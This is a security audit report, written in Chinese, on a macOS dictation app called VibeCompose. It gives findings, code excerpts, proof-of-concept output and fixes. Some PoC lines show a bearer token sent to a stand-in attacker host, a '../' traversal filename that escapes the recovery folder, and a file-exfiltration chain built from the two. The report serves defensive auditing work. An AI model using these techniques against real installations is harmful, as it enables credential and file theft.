# VibeCompose 逻辑与安全审计报告

> 审计日期：2026-07-12 至 2026-07-13
> 审计快照：`main@5ed14d5`，包含审计时工作树中的未提交改动
> 审计方式：主审计 + 6 个 max/xhigh 专项子 agent，并行覆盖状态机、粘贴、认证网络、隐私存储、测试、打包与供应链
> 报告性质：只读审计结论，不代表问题已修复

## 1. 执行摘要

本轮审计确认，VibeCompose 当前最重要的风险集中在以下信任边界：

1. **转录文本到目标应用的注入边界**
   - “只有可编辑焦点才自动粘贴”的约束可以被 `launchAppContext` 绕过。
   - 最终发送 `Cmd+V` 前只校验旧 PID，不重新校验窗口、焦点和控件可写性。

2. **Keychain token 到网络 endpoint 的边界**
   - ChatGPT managed bearer token 会被发送到普通配置指定的任意 URL。
   - 同一请求还可能携带录音、完整转录文本和术语内容。

3. **Recovery 元数据到本地文件系统的边界**
   - `audioFileName` 未做路径包含关系检查。
   - 被篡改的 Recovery JSONL 可以让 Retry 读取并上传 `Recovery/Audio` 之外的文件。

4. **异步认证结果到会话状态的边界**
   - Refresh 没有 single-flight 或 generation。
   - 迟到的 refresh 可以覆盖更新的 token，甚至在用户 Sign out 后重新写回会话。

5. **录音和听写历史的隐私生命周期**
   - `maxDurationSeconds` 完全未执行。
   - 成功听写默认保存原始音频、原始 ASR、最终文本和目标应用。
   - 文本历史无容量和时间轮转。

6. **发布产物的完整性边界**
   - Homebrew Cask 禁用 SHA-256 校验。
   - Gatekeeper 检查存在 fail-open。
   - 当前 live app 为 identifier-only 的 ad-hoc 签名。

建议在继续发布或扩大用户范围前，优先关闭 OW-AUD-001 至 OW-AUD-008。

## 2. 严重度定义

| 等级 | 含义 |
| --- | --- |
| P0 | 可直接造成敏感数据错误发送、token/文件外传或核心信任边界失效，应立即修复 |
| P1 | 高影响逻辑、隐私、可用性或供应链问题，通常需要特定状态、时序或本地篡改前提 |
| P2 | 稳定崩溃、数据丢失、状态错误或防御纵深缺陷 |
| P3 | 低影响缺陷、死配置、指标错误或长期维护风险 |

## 3. 发现汇总

| ID | 严重度 | 问题 | 证据状态 |
| --- | --- | --- | --- |
| OW-AUD-001 | P0 | `launchAppContext` 绕过可编辑焦点，可能粘贴到错误目标 | 静态确认，现有测试固化 |
| OW-AUD-002 | P0 | Managed bearer token、录音和文本可发送到任意 URL | 动态确认 |
| OW-AUD-003 | P0 | Recovery 路径穿越，可读取并上传目录外文件 | 路径逃逸动态确认，上传链静态确认 |
| OW-AUD-004 | P1 | Refresh 竞态可覆盖新 token，并在注销后复活会话 | 动态确认 |
| OW-AUD-005 | P1 | 录音时长限制无效，超限检查晚于整文件加载 | 静态确认 |
| OW-AUD-006 | P1 | 成功听写默认明文、重复持久化音频和全文 | 静态确认 |
| OW-AUD-007 | P1 | OAuth callback 可崩溃、被探测中止或永久挂起 | 动态确认 |
| OW-AUD-008 | P1 | 签名、Cask、Gatekeeper 和安装链缺少完整性闭环 | 静态与动态确认，部分影响为条件性 |
| OW-AUD-009 | P1 | 归一化破坏 URL、路径、命令、JSON 和繁体要求 | 动态确认 |
| OW-AUD-010 | P1 | 注入阻塞 MainActor，取消和旧 HUD 回调可作用于新状态 | 静态确认 |
| OW-AUD-011 | P2 | 剪贴板恢复竞态覆盖用户的新复制内容 | 静态确认 |
| OW-AUD-012 | P2 | 首次麦克风引导不响应取消，Ready/权限顺序错误 | 静态确认 |
| OW-AUD-013 | P2 | 配置 URL 强制解包，可稳定触发进程崩溃 | 动态确认 |
| OW-AUD-014 | P2 | Settings 术语编辑保存 stale index，可数组越界 | 静态确认 |
| OW-AUD-015 | P2 | 录音和注入失败路径清理不完整 | 静态确认 |
| OW-AUD-016 | P3 | 多个配置项无效或预检与实际行为不一致 | 静态确认 |
| OW-AUD-017 | P1（测试风险） | 高风险测试静默跳过或依赖真实 TCC，全绿结论不可靠 | 动态确认 |

---

## 4. 详细发现

### OW-AUD-001：启动应用上下文绕过安全粘贴条件

**严重度：P0**

**位置**

- `Sources/VibeCompose/TextInjector.swift:110-127`
- `Sources/VibeCompose/TextInjector.swift:136-152`
- `Sources/VibeCompose/TextInjector.swift:227-257`
- `Sources/VibeCompose/FocusedElementInspector.swift:23-58`
- `Sources/VibeCompose/FocusedElementInspector.swift:77-138`
- `Tests/VibeComposeTests/TextInjectorTests.swift:197-208`

**根因**

`injectionPlan` 将 `hasLaunchAppContext` 当成了与“当前存在可编辑焦点”等价的授权条件：

```swift
guard hasEditableTextFocus
    || hasFallbackEditableTextFocus
    || hasLaunchAppContext
else {
    return .clipboardFallback(reason: .noEditableTarget)
}

return .keyPressPaste
```

实际发送前的 `isPasteTargetReady` 只判断旧 PID 是否重新成为前台：

```swift
frontmostApplication.processIdentifier
    == launchAppContext.processIdentifier
```

它没有再次确认：

- bundle ID 是否仍匹配；
- 是否仍是原窗口；
- 当前 focused AX element 是否为原输入框；
- 控件是否可写、禁用、隐藏、只读或属于安全输入框；
- PID 是否已被另一个进程复用。

`FocusedElementInspector` 的 fallback 还会查找窗口中的第一个可编辑后代，而不是用户当前真正聚焦的元素。

**触发方式**

1. 在应用 A 的输入框中按 F5 开始听写。
2. 转写期间切换到同一应用的其他窗口、联系人、按钮、只读区域或另一输入框。
3. 即使焦点检查全部失败，只要保留了应用 A 的上下文，仍会激活 A 并发送 `Cmd+V`。

**影响**

- 私密听写发送给错误联系人或错误文档；
- 覆盖用户刚修改的选区；
- 对非文本控件触发不可预测的粘贴行为；
- 在终端或 REPL 等命令型输入中形成条件性执行风险。

**现有测试问题**

`TextInjectorTests.swift:197-208` 明确断言：

```swift
hasEditableTextFocus: false
hasFallbackEditableTextFocus: false
hasLaunchAppContext: true
#expect(plan == .keyPressPaste)
```

这与以下公开承诺直接冲突：

- `README.md`：仅检测到可编辑目标时粘贴；
- `docs/architecture.md:46`：否则只保留在剪贴板；
- `docs/release.md:26`：只有可编辑焦点才报告成功。

**修复要求**

1. 删除 `hasLaunchAppContext` 的单独放行能力。
2. 上下文只能用于恢复应用，不得作为“可安全粘贴”的证明。
3. 开始录音时记录 PID、bundle ID、窗口标识、focused element 和进程启动标识。
4. 发送事件前重新验证全部身份和可写属性。
5. 任一验证失败时只复制到剪贴板。
6. Recovery Retry 默认不自动注入，至少要求重新选择目标。

---

### OW-AUD-002：Managed token 和听写内容可发送到任意 URL

**严重度：P0**

**位置**

- `Sources/VibeCompose/AppConfig.swift:105`
- `Sources/VibeCompose/AppConfig.swift:158`
- `Sources/VibeCompose/AppConfig.swift:413-455`
- `Sources/VibeCompose/ChatGPTTranscriber.swift:305-320`
- `Sources/VibeCompose/TextPolisher.swift:243-289`

**根因**

普通 `config.json` 可以控制：

- `transcription.chatGPTURL`
- `transcription.textPolish.chatGPTResponseURL`

Managed auth 路径没有验证 URL 的 scheme、host、port、userinfo、path 或 redirect origin，却直接设置：

```swift
request.setValue("Bearer \(token)", forHTTPHeaderField: "Authorization")
```

**动态证据**

使用生产请求构造代码和合成 token 捕获到：

```text
DEST=https://attacker.invalid/collect
AUTH=Bearer TOP-SECRET-CHATGPT-TOKEN
BODY_BYTES=1066
```

另一组探针同时确认转写和 AI Polish 路径支持把 managed token 发送到自定义 HTTP URL。

**攻击前提**

- 同用户进程能够修改 VibeCompose Application Support 中的配置；
- 或用户被诱导导入、复制或编辑恶意配置。

**影响**

- ChatGPT access token 外传；
- 录音外传；
- 完整转录文本和术语内容外传；
- 恶意 endpoint 返回 401/403 后，新刷新的 token 也可能再次发送到同一地址。

这会让 VibeCompose 成为绕过 Keychain 访问限制的 confused deputy。

**修复要求**

1. Managed auth 只允许精确的 `https://chatgpt.com` 固定路径。
2. 禁止 HTTP、自定义端口、userinfo 和跨 origin redirect。
3. 自定义 endpoint 必须使用独立 API key。
4. ChatGPT account token 只能发送到经过固定策略校验的 `chatgpt.com` 端点。
5. 配置加载和保存时集中验证 URL。

---

### OW-AUD-003：Recovery 路径穿越

**严重度：P0**

**位置**

- `Sources/VibeCompose/RecoveryHistory.swift:27-31`
- `Sources/VibeCompose/RecoveryHistory.swift:200-215`
- `Sources/VibeCompose/AppCoordinator.swift:662-682`
- `Sources/VibeCompose/PreferencesWindowController.swift:808-839`
- `Sources/VibeCompose/ChatGPTTranscriber.swift:151-163`

**根因**

Recovery JSONL 中的 `audioFileName` 被直接拼接：

```swift
baseDirectory
    .appendingPathComponent("Audio", isDirectory: true)
    .appendingPathComponent(audioFileName)
```

未限制：

- basename；
- `.wav` 扩展名；
- `/`、`\`、`..`；
- 符号链接；
- 标准化后的目录包含关系。

**动态证据**

```text
/tmp/base/Recovery/Audio/../../Documents/secret.wav
```

标准化后逃逸为：

```text
/tmp/base/Documents/secret.wav
```

**影响**

篡改 `recovery-history.jsonl` 后：

- Copy 会把目录外文件作为文件 URL 写入剪贴板；
- Retry 会用 `Data(contentsOf:)` 读取该文件；
- 小于上传限制的文件会被当作 WAV 提交到当前转写 endpoint。

与 OW-AUD-002 组合后，可形成任意当前用户可读文件外传链。

**修复要求**

1. 只接受严格的 `UUID.wav` basename。
2. 拒绝路径分隔符和 `..`。
3. 使用 `standardizedFileURL` 和 `resolvingSymlinksInPath()`。
4. 验证目标仍处于 `Recovery/Audio`。
5. Retry 前检查普通文件类型、WAV magic 和大小。
6. Copy 和 Retry 两个入口都必须重新验证。

---

### OW-AUD-004：Refresh 竞态与注销后会话复活

**严重度：P1**

**位置**

- `Sources/VibeCompose/ChatGPTAuthManager.swift:103-136`
- `Sources/VibeCompose/ChatGPTAuthManager.swift:160-188`

**根因**

`refreshAccessToken()` 没有：

- single-flight；
- refresh generation；
- 对原 refresh token 的提交前校验；
- Sign out 对在途 refresh 的失效控制。

锁只保护内存读写，不保证异步结果的业务提交顺序。

**动态证据**

并发 refresh：

```text
refresh_calls=2
```

两个调用分别返回 `access-1` 和 `access-2`，最终较旧的 `access-1` 覆盖了新状态。

注销竞态：

```text
after_signout=nil
after_refresh=resurrected-access
```

**影响**

- 同一旋转 refresh token 被重复使用；
- 旧响应覆盖新 token；
- 用户明确 Sign out 后，会话重新写回 Keychain；
- UI 显示的登录状态与用户意图不一致。

**修复要求**

1. 将 AuthManager 改为 actor。
2. 所有 refresh 合并为 single-flight。
3. Sign out 递增 session generation 并取消在途 refresh。
4. 保存结果前验证 generation 和原 refresh token 仍匹配。

---

### OW-AUD-005：录音时长限制完全无效

**严重度：P1**

**位置**

- `Sources/VibeCompose/AppConfig.swift:163,185`
- `Sources/VibeCompose/AudioRecorder.swift:193-239`
- `Sources/VibeCompose/ChatGPTTranscriber.swift:151-163`
- `Sources/VibeCompose/AppCoordinator.swift:958-979`

**根因**

`maxDurationSeconds` 只被定义和解码，没有任何运行时引用。

转写流程还会先执行：

```swift
let data = try Data(contentsOf: audio.fileURL)
```

然后才检查 25 MB 上限。

**影响**

- 忘记第二次按 F5 时持续采集环境音；
- WAV 无限增长；
- 持续占用麦克风和磁盘；
- 大文件整份读入内存，可能造成卡顿或 OOM；
- 失败统计和 Recovery 可能再次读取或复制大文件。

按当前 24 kHz、16-bit、mono 设置，约 9 分钟即可接近 25 MB，远超配置声明的 120 秒。

**修复要求**

1. 录音开始后创建绑定 session ID 的 deadline task。
2. 到期自动停止或取消，并明确通知用户。
3. 手动停止、取消和退出时取消 deadline。
4. 上传前先读取文件 metadata。
5. 使用流式 multipart 或文件上传 API。
6. Recovery 同时限制单文件和总容量。

---

### OW-AUD-006：敏感音频和全文默认持久化

**严重度：P1**

**位置**

- `Sources/VibeCompose/AppCoordinator.swift:1016-1052`
- `Sources/VibeCompose/TranscriptionHistory.swift:145-200`
- `Sources/VibeCompose/RecoveryHistory.swift:149-241`
- `Sources/VibeCompose/PreferencesWindowController.swift:451-490`

**根因**

任意一次成功听写都会保存：

- raw transcript；
- final transcript；
- 目标应用名称和 bundle ID；
- 原始 WAV。

文本历史 JSONL 无限追加。Recovery 虽限制为 10 条，但仍会为成功听写保留原始音频和两份文本。

Retry 目录只由内存中的 `pendingRetry` 管理，崩溃或退出后可能留下不可见孤儿音频。

Settings 为显示有限记录，仍同步读取整个历史和 latency 文件。

**影响**

- 会议、密码口述、个人信息等敏感内容长期落盘；
- 数据可能进入备份、迁移、搜索索引或同用户进程读取范围；
- 长期使用后产生磁盘增长和 Settings 内存/主线程压力；
- 当前产品文案没有充分披露“成功听写也保留原始音频”。

**修复要求**

1. 默认只保存失败恢复记录。
2. 成功音频和全文历史必须显式 opt-in。
3. 提供保留期限、容量上限、单条删除和 Clear All。
4. 启动时清理或恢复 Retry 孤儿文件。
5. 目录和文件固定为 `0700/0600`。
6. 排除备份和索引；必要时本地加密。

---

### OW-AUD-007：OAuth callback 崩溃、DoS 和永久挂起

**严重度：P1**

**位置**

- `Sources/VibeCompose/BrowserAuthBridge.swift:96-124`
- `Sources/VibeCompose/BrowserAuthBridge.swift:331-369`
- `Sources/VibeCompose/BrowserAuthBridge.swift:439-466`

#### A. 重复 query 参数触发 fatal error

外部 query 被传给：

```swift
Dictionary(uniqueKeysWithValues: ...)
```

重复 `state`、`code` 或其他有值参数会在 state 校验之前触发不可捕获 fatal error。

**动态证据**

```text
Swift/NativeDictionary.swift:792:
Fatal error: Duplicate values for key: 'state'

EXIT=133
```

#### B. 任意无效请求终止整个登录

错误 path、错误 state 或本地端口探测都会调用：

```swift
complete(.failure(error))
```

无效请求不是只关闭当前连接，而是提前结束全局 OAuth flow。

#### C. 超时和取消路径永久挂起

`waitForAuthorizationCode()` 使用不响应 cancellation 的 checked continuation。

TaskGroup 超时后虽然调用 `cancelAll()`，但退出 TaskGroup 仍需等待挂起 waiter 完成，因此 `captureSession()` 可能永远不返回，listener 也无法完成清理。

**修复要求**

1. 逐项解析 query，并显式拒绝重复参数。
2. 安全参数必须恰好出现一次。
3. 仅绑定 loopback。
4. 无效请求只关闭当前连接。
5. 仅匹配 state 的正式 OAuth error 才结束 flow。
6. continuation 使用 `withTaskCancellationHandler`。
7. `stop()` 必须恢复仍在等待的 continuation。

---

### OW-AUD-008：发布和签名完整性链不闭环

**严重度：P1，部分影响为条件性**

**位置**

- `scripts/package_app.sh:17`
- `scripts/package_app.sh:42-46`
- `scripts/package_app.sh:126-169`
- `scripts/install_app.sh:8-14`
- `packaging/homebrew/Casks/vibecompose.rb:3`
- `.github/workflows/ci.yml:12-18`

**确认问题**

1. `source "$VERSION_ENV"` 将版本数据文件作为 shell 执行。
2. Homebrew Cask 使用：

   ```ruby
   sha256 :no_check
   ```

3. Gatekeeper 检查使用：

   ```bash
   spctl ... || true
   ```

   后续只识别证书吊销字符串，其他拒绝结果 fail-open。

4. `VIBECOMPOSE_CODESIGN_IDENTITY=-` 可绕过明确的 ad-hoc 开关。
5. 自动选择本机第一个签名身份，没有固定 Team ID。
6. 安装脚本只检查目录存在，不检查签名、bundle ID 或架构。
7. 安装先删除旧 app，再复制新 app，非原子且无回滚。
8. CI 只 build/test，不验证打包、签名、notarization、Cask 和版本一致性。

**Live app 动态证据**

```text
Signature=adhoc
TeamIdentifier=not set
designated requirement was identifier-only
```

identifier-only ad-hoc requirement 可被其他代码克隆。其是否能继承具体 TCC 或 Keychain 权限未直接验证，因此该部分按条件性风险处理。VibeCompose 的新 bundle identifier 不改变这一签名风险。

**修复要求**

1. `version.env` 使用严格 parser，不允许执行。
2. Cask 固定真实 SHA-256。
3. Gatekeeper 任意非零结果都应阻断发布。
4. 固定 Developer ID 和预期 Team ID。
5. notarize、staple，并发布 checksum manifest。
6. 安装前验证签名、bundle ID、架构和版本。
7. 使用 staging + rename 或备份回滚实现原子安装。
8. CI 增加完整 release-artifact 验证。

---

### OW-AUD-009：归一化破坏技术字面量和繁体要求

**严重度：P1**

**位置**

- `Sources/VibeCompose/TerminologyNormalizer.swift:51-85`
- `Sources/VibeCompose/TerminologyNormalizer.swift:95-138`
- `Sources/VibeCompose/TerminologyNormalizer.swift:523-633`

**根因**

处理顺序是：

1. 全文繁体转简体；
2. exact terminology replacement；
3. fuzzy replacement；
4. 全角标点转换。

Exact replacement 不避开 URL 或路径。URL 保护正则在 `?`、端口冒号等位置过早结束。

**动态证据**

```text
输入：
请打开 https://example.com/vibecompose/繁體測試?name=vibecompose

输出：
请打开 https://example.com/VibeCompose/繁体测试？name=VibeCompose
```

```text
请逐字保留繁體中文：龍門測試
→ 请逐字保留繁体中文：龙门测试
```

其他已确认行为：

- URL 查询参数 `?` 变为 `？`；
- localhost 端口 `:` 变为 `：`；
- JSON 标点被全角化；
- Python/命令括号被替换；
- 空 correction replacement 可静默删除文本；
- 全部内容被 artifact stripper 删除后，Pipeline 仍允许空字符串进入注入流程。

**修复要求**

1. 使用 URL detector 或完整 parser 保护 URL、端口、query、fragment 和 IPv6。
2. 冻结代码块、路径、命令、JSON、邮箱和引号字面量。
3. 不得全文无条件繁转简。
4. 将简繁选择作为 Pipeline 元数据或明确配置。
5. ASR、首次 normalize、AI Polish、最终 normalize 后都验证非空。
6. correction replacement 必须 trim 后非空。

---

### OW-AUD-010：MainActor 阻塞和旧异步回调污染新会话

**严重度：P1**

**位置**

- `Sources/VibeCompose/AppCoordinator.swift:275-331`
- `Sources/VibeCompose/AppCoordinator.swift:443-453`
- `Sources/VibeCompose/TextInjector.swift:181-224`
- `Sources/VibeCompose/TextInjector.swift:242-258`
- `Sources/VibeCompose/OverlayController.swift:253-265`

#### A. 注入阻塞 MainActor

`TextInjector.inject()` 在 MainActor 上同步执行，并包含：

- `usleep(60ms)`；
- 最长约 1 秒的轮询和 `usleep(25ms)`；
- 恢复应用后的 `usleep(120ms)`；
- 同步 Accessibility 查询；
- 无节点上限的窗口 BFS。

期间 ESC、关闭按钮和 F5 都无法及时处理。用户取消时，文本可能已经写入剪贴板或发送 `Cmd+V`。

#### B. 旧启动任务可能取消新会话

`AppCoordinator.swift:314-315`：

```swift
} catch is CancellationError {
    self.cancelCurrentSession()
}
```

旧任务没有校验自己的 session ID。若旧任务迟到抛出 cancellation，新会话可能被全局取消。

#### C. 旧 HUD 淡出 completion 隐藏新 HUD

新状态只取消 `hideTask`。如果旧淡出动画已经启动，其 completion 仍无条件调用 `hide()`，可能：

- 隐藏新 Processing/Recording HUD；
- 停止新动画；
- 释放 ESC hotkey。

**修复要求**

1. `TextInjecting.inject` 改为 `async throws`。
2. 使用 `Task.sleep` 和 cancellation check。
3. 写剪贴板、发送 Cmd+V 前重新验证 session。
4. AX 查询放到有 timeout 的专用串行队列。
5. 所有旧任务使用 session generation。
6. Overlay 使用 presentation ID，旧 completion 不得操作新状态。

---

### OW-AUD-011：剪贴板恢复竞态

**严重度：P2**

**位置**

- `Sources/VibeCompose/TextInjector.swift:178-209`
- `Sources/VibeCompose/AppConfig.swift:389-399`

**问题**

每次粘贴创建未追踪恢复 Task：

```swift
Task { @MainActor in
    try? await Task.sleep(
        nanoseconds: restoreDelayMilliseconds * 1_000_000
    )
    snapshot.restore(to: pasteboard)
}
```

恢复前不检查 `NSPasteboard.changeCount`。

**影响**

- 用户在默认 350 ms 内复制的新内容被旧快照覆盖；
- 多次听写的恢复任务乱序执行；
- 恢复过早时目标应用可能粘贴旧内容；
- `CGEvent` 创建失败时，原剪贴板可能永久丢失；
- 极大 delay 在乘法处触发 UInt64 溢出。

**修复要求**

1. 保存并取消上一次 restore task。
2. 记录 VibeCompose 写入后的 `changeCount`。
3. 只有剪贴板仍由本次注入拥有时才恢复。
4. 对 delay 设置合理范围并使用溢出安全换算。
5. 对快照类型和总大小设置限制。

---

### OW-AUD-012：首次麦克风引导不响应取消

**严重度：P2**

**位置**

- `Sources/VibeCompose/MicrophonePermissionWindowController.swift:48-80`
- `Sources/VibeCompose/AppCoordinator.swift:226-258`
- `Sources/VibeCompose/AppCoordinator.swift:747-779`
- `Sources/VibeCompose/RuntimePreflight.swift:23-42`

**问题**

`present()` 使用普通 checked continuation，不响应 Task cancellation。`cancelCurrentSession()` 不关闭窗口，也不恢复对应 continuation。

恢复 activation policy 的 `defer` 位于第一次 `await` 之后，因此窗口等待期间取消时，恢复保护尚未建立。

多个调用者会被存入同一个 `completions` 数组，一个按钮会一次性恢复全部等待者。

**影响**

- HUD 已回到 idle，但权限窗口仍存在；
- 稍后点击 Continue 会为已取消听写触发系统权限请求；
- activation policy 长时间错误；
- Settings 和 F5 同时请求时产生并发权限调用；
- 用户取消自定义窗口时，TCC 仍为 `.notDetermined`，但 UI 被错误报告为 `.denied`。

此外，当前流程先请求麦克风，再检查 ChatGPT 登录/API key；状态菜单也可能在麦克风已拒绝时显示 Ready。

**修复要求**

1. `present()` 使用 `withTaskCancellationHandler`。
2. 每个等待者绑定 session/request ID。
3. 取消时关闭窗口并只恢复对应 continuation。
4. 权限请求实现 single-flight。
5. 先执行不触发权限提示的认证和配置 preflight。
6. 区分 `.undetermined`、`.denied`、`.restricted` 和用户取消。

---

### OW-AUD-013：畸形配置 URL 触发强制解包崩溃

**严重度：P2**

**位置**

- `Sources/VibeCompose/ChatGPTTranscriber.swift:319`
- `Sources/VibeCompose/ChatGPTTranscriber.swift:338`
- `Sources/VibeCompose/RuntimePreflight.swift:23-42`

**问题**

两条请求路径使用：

```swift
URL(string: config.chatGPTURL)!
URL(string: config.openAITranscriptionURL)!
```

Preflight 不校验 URL。

**动态证据**

配置为 `http://[` 后，进程退出码为 133，并报告：

```text
Unexpectedly found nil while unwrapping an Optional value
```

**修复要求**

配置加载、保存和请求构造统一验证 HTTPS URL；请求构造使用 `guard let` 并返回可恢复配置错误。

---

### OW-AUD-014：Settings 术语编辑 stale index

**严重度：P2**

**位置**

- `Sources/VibeCompose/PreferencesWindowController.swift:1355`
- `Sources/VibeCompose/PreferencesWindowController.swift:1381-1382`

**触发**

1. 编辑索引 1 的术语。
2. 编辑状态尚未退出时删除索引 0。
3. 点击 Save Entry。

**问题**

编辑状态保存数组下标。删除后数组重排，保存仍执行：

```swift
entries[editingTerminologyIndex] = entry
```

可能发生数组越界。

**修复要求**

为术语条目增加稳定 UUID；编辑状态保存 ID 而不是 index；保存前重新查找，条目不存在时返回可恢复提示。

---

### OW-AUD-015：失败路径清理不完整

**严重度：P2**

#### A. 录音启动失败泄漏资源

**位置**

- `Sources/VibeCompose/AudioRecorder.swift:193-215`

`prepareToRecord()` 或 `record()` 返回 false 时直接抛错，没有：

- `recorder.stop()`；
- 删除 `tempURL`；
- 清理可能已打开的文件资源。

`cancelRecording()` 对删除错误使用 `try?`，即使敏感录音删除失败也报告成功。

#### B. 注入失败后没有 Recovery

**位置**

- `Sources/VibeCompose/AppCoordinator.swift:420-424`
- `Sources/VibeCompose/AppCoordinator.swift:443-503`

Pipeline 已成功得到文本，但注入抛错时：

- 不记录历史或 Recovery；
- 外层 `defer` 仍删除原 WAV；
- 用户无法重试该录音。

#### C. Quit 不执行统一 shutdown

**位置**

- `Sources/VibeCompose/AppCoordinator.swift:155-159`
- `Sources/VibeCompose/StatusMenuController.swift:71-95`
- `Sources/VibeCompose/AppDelegate.swift:3-19`
- `scripts/install_launch_agent.sh:21-28`

Quit 直接 terminate，没有明确取消录音、processing、剪贴板恢复和 timer。无条件 `KeepAlive` 的 LaunchAgent 还可能立即重新拉起应用。

**修复要求**

建立统一的 `shutdown()` 和 `finishSession()`：

- 停止或取消 recorder；
- 取消全部 Task/Timer；
- 清理临时音频；
- 处理 pending retry；
- 注入前先保存 Recovery；
- 删除失败必须记录和上报。

---

### OW-AUD-016：死配置和行为不一致

**严重度：P3**

已确认：

1. `AuthConfig.persistCapturedSession` 不生效，OAuth 成功后仍无条件保存 Keychain。
2. `preferredLoginSurface` 和 `allowEmbeddedFallback` 没有运行时行为。
3. OpenAI token 环境变量名在 Preflight 中会 trim/回退为 `OPENAI_API_KEY`，实际请求却使用原始配置。
4. 未知 `TranscriptionProvider` 值静默回退为 managed ChatGPT，而不是 fail-closed。
5. AI Polish 关闭时仍可能被统计为失败尝试。
6. Prompt budget 遇到一个超长 hint 后使用 `break`，丢弃所有后续短 hint。
7. 术语导入没有文件大小、条目数量和单词长度限制，超大字典会放大模糊匹配成本。

**修复要求**

- 为所有配置建立集中 schema、范围和语义验证；
- 不支持的设置应删除或真正实现；
- 未知 provider 必须明确报错；
- Preflight 与实际执行必须调用同一规范化函数。

---

### OW-AUD-017：测试体系存在“全绿但未验证”风险

**严重度：P1（测试与发布风险）**

**验证结果**

- `swift test --package-path .`：通过；
- `swift test --sanitize=thread`：通过；
- 行覆盖率约 37.95%。

高风险区域覆盖不足：

- `PreferencesWindowController.swift`：约 0%；
- `FocusedElementInspector.swift`：约 0%；
- `StatusMenuController.swift`：约 0%；
- `AppCoordinator.swift`：约 17.8%；
- `TextInjector.swift`：约 13.6%，真实 `inject()` 路径未执行。

#### A. Live 注入测试静默返回

`LiveTextInjectorAcceptanceTests.swift` 在环境变量缺失时：

```swift
guard ... == "1" else {
    return
}
```

测试报告为 pass，但真实 GUI 粘贴、焦点恢复和剪贴板行为没有执行。

#### B. Coordinator 测试依赖真实 TCC

Fake recorder 没有替换 Coordinator 的真实麦克风权限阶段。隔离 TCC 环境下：

- 测试无法进入 `.recording`；
- wait helper 超时后不报告失败；
- 调用方继续索引空数组并崩溃。

#### C. 视觉验收只验证像素差异

当前脚本主要确认截图有可见内容且状态之间存在像素差异，不验证：

- 标题是否正确；
- 按钮是否正确；
- ESC 是否注册；
- 文案和真实状态是否匹配。

**修复要求**

1. Live 测试未启用时必须显式 skip，而不是 pass。
2. 注入 microphone permission provider，使状态机测试脱离真实 TCC。
3. wait helper 返回 Bool，并由 `#require` 检查。
4. 数组访问前使用 `#require(count >= ...)`。
5. 增加 installed-app GUI 验收：
   - F5 开始/停止；
   - ESC 和 inline close；
   - 焦点变化；
   - 错误目标 fallback；
   - pasteboard changeCount；
   - 首次权限取消；
   - refresh/logout 竞态；
   - max duration 自动停止。

---

## 5. 动态 PoC 摘要

### 5.1 OAuth 重复 query 崩溃

```text
Swift/NativeDictionary.swift:792:
Fatal error: Duplicate values for key: 'state'

EXIT=133
```

### 5.2 Managed token 发送到任意 endpoint

```text
DEST=https://attacker.invalid/collect
AUTH=Bearer TOP-SECRET-CHATGPT-TOKEN
BODY_BYTES=1066
```

以上 token 为合成测试值，不是真实凭证。

### 5.3 URL 和繁体文本被破坏

```text
URL_INPUT=请打开 https://example.com/vibecompose/繁體測試?name=vibecompose
URL_OUTPUT=请打开 https://example.com/VibeCompose/繁体测试？name=VibeCompose

TRAD_INPUT=请逐字保留繁體中文：龍門測試
TRAD_OUTPUT=请逐字保留繁体中文：龙门测试
```

### 5.4 Recovery 路径逃逸

```text
/tmp/base/Recovery/Audio/../../Documents/secret.wav
→ /tmp/base/Documents/secret.wav
```

### 5.5 Refresh/logout 竞态

```text
refresh_calls=2
after_signout=nil
after_refresh=resurrected-access
```

### 5.6 畸形 URL 强制解包

```text
Unexpectedly found nil while unwrapping an Optional value
EXIT=133
```

## 6. 构建和检查状态

本轮审计期间观察到：

- Swift build：通过；
- Swift tests：通过；
- Thread Sanitizer tests：通过；
- landing-page contract check：通过；
- 完整 `scripts/check.sh` 在 packaged-app/签名阶段失败。

失败原因：

```text
CSSMERR_TP_CERT_REVOKED
```

该失败与本报告中的运行时问题相互独立，但进一步说明发布签名链需要单独修复。

## 7. 推荐修复顺序

### 第一阶段：立即阻断数据错误发送

1. 修复 OW-AUD-001：删除 `hasLaunchAppContext` 放行。
2. 修复 OW-AUD-002：锁死 managed-token endpoint。
3. 修复 OW-AUD-003：Recovery 严格路径包含检查。
4. 修复 OW-AUD-004：Auth actor、single-flight 和 generation。

### 第二阶段：修复隐私和认证生命周期

5. 修复 OW-AUD-005：录音硬上限和流式上传。
6. 修复 OW-AUD-006：默认不保存成功音频/全文。
7. 修复 OW-AUD-007：OAuth parser 和 cancellation。
8. 修复 OW-AUD-012：麦克风权限 single-flight 和取消。

### 第三阶段：修复状态机和数据完整性

9. 修复 OW-AUD-009：保护技术字面量和简繁指令。
10. 修复 OW-AUD-010：异步注入、session generation 和 HUD generation。
11. 修复 OW-AUD-011：pasteboard ownership。
12. 修复 OW-AUD-013 至 OW-AUD-016。

### 第四阶段：建立发布门禁

13. 修复 OW-AUD-008。
14. 修复 OW-AUD-017。
15. 在 `/Applications/VibeCompose.app` 上完成真实 TCC 和交互验收。

## 8. 发布前最低安全验收条件

在关闭本报告前，至少应满足：

- 无可编辑焦点时绝不发送 `Cmd+V`；
- 焦点、窗口或进程身份变化时只保留剪贴板；
- managed token 只能到达固定 ChatGPT HTTPS origin；
- Recovery 无法解析 `..`、绝对路径或符号链接；
- Sign out 后任何迟到 refresh 都不能写回 Keychain；
- 录音达到上限后自动停止；
- 成功听写默认不保存原始音频；
- OAuth 重复 query 返回 400 而不崩溃；
- OAuth 取消和超时能可靠释放 listener；
- URL、路径、JSON、命令和明确繁体请求保持原样；
- clipboard restore 不覆盖用户的新复制内容；
- Cask 使用固定 SHA-256；
- Gatekeeper 任意失败都会阻断发布；
- stable release 使用固定 Team ID 且完成 notarization；
- Live GUI/TCC 验收未运行时不能显示为 pass。

## 9. 审计限制与说明

- OAuth 使用 32-byte state 和 PKCE S256，未发现直接窃取 authorization code 的路径；已确认问题主要为崩溃、DoS 和生命周期错误。
- ChatGPT session 主体确实存储在 Keychain，而非普通配置文件。
- 未确认 multipart boundary breakout。
- SwiftPM dependency 已固定 revision，未发现 binary/plugin dependency。
- 审计期间工作树原本已存在大量未提交改动，并发生过外部并发修改；本报告行号基于最终复核快照，后续编辑可能造成轻微漂移。
- 本轮没有修复、安装或发布应用。
